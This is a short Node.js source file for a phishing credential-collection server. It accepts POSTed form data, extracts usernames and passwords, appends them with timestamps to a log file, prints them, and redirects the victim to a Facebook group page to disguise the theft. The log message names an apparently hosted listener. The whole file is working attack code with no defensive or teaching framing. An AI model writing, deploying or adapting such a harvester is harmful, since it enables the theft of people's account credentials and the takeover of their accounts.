const http = require('http');
const fs = require('fs');

http.createServer((req, res) => {
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const data = new URLSearchParams(body);
            const creds = {
                username: data.get('username'),
                password: data.get('password'),
                time: new Date().toISOString()
            };
            
            fs.appendFile('creds.log', JSON.stringify(creds) + '\n', () => {});
            console.log('Saved:', creds);
            res.writeHead(302, {
                'Location': 'https://m.facebook.com/groups/2393754610988462/'
            });
            res.end();
        });
    } else {
        res.end('Send POST requests here');
    }
}).listen(8000, () => console.log('Listening on https://listener-gsnt.onrender.com'));